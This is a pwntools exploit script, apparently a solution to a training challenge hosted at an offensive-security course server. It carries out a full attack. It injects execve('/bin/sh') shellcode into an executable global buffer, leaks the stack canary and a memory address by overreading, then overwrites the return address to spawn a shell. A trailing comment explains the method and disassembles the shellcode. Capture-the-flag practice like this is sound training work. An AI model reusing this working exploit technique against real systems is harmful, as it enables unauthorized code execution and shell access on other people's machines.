from pwn import *
from sys import *


SERVER = "bin.training.offdef.it"
PORT = "2012"
BINARY = "./asrl"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
     
    gdb.attach(r, """
        #breakpoints
        #b
        c
        """)
    #input("wait")


#code
    
#script for the OFFSET
# r.send(b"AAAAA")
# sleep(0.1)
# print(r.recv())
# for i in range(1, 200):
#    sleep(0.1)
#    print("OFFSET ", i)
#    r.send(b'A'*(i))
#    sleep(0.1)
#    print(r.recv())
# exit()


#r.interactive()
timesleep=0.1

#load shell code in global variable
shellcode=b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xD2\x48\x31\xF6\x48\x8D\x3D\x02\x00\x00\x00\x0F\x05/bin/sh\x00"
r.send(shellcode)
sleep(timesleep)

#leaking canary
r.send(b"B"*0x69)
sleep(timesleep)
r.recvuntil(b'> ')
r.read(0x69)
canary= b'\x00'+r.read(7)
canary = u64(canary)
print("canary: ", hex(canary))

#leaking global variable addr
r.send(b"B"*136)
sleep(timesleep)
r.recvuntil(b'> ')
r.read(136)
mem= r.read(7).ljust(8, b'\x00')
mem = u64(mem)
print("mem addr leak: ", hex(mem))
ps1 = mem+0x200720
print("ps1 addr leak: ", hex(ps1))

#run shellcode overwriting the ret addr
r.send(b"B"*0x68+p64(canary)+p64(ps1)*2)
sleep(timesleep)
r.send(b'\n')

r.interactive()

'''
basycally the same of gonna leak and leakers, the only difference was that here there
was an allocation of executable memory so you had to insert the shellcode there. 
Bacause of that the necessary leak was a little bit different. 

Always see for the leak remotely, don't trust your own shell. 

I copy the shellcode because it was a standard one

0:  48 c7 c0 3b 00 00 00    mov    rax,0x3b
7:  48 31 d2                xor    rdx,rdx
a:  48 31 f6                xor    rsi,rsi
d:  48 8d 3d 02 00 00 00    lea    rdi,[rip+0x2]        # 16 <_main+0x16>
14: 0f 05                   syscall
'''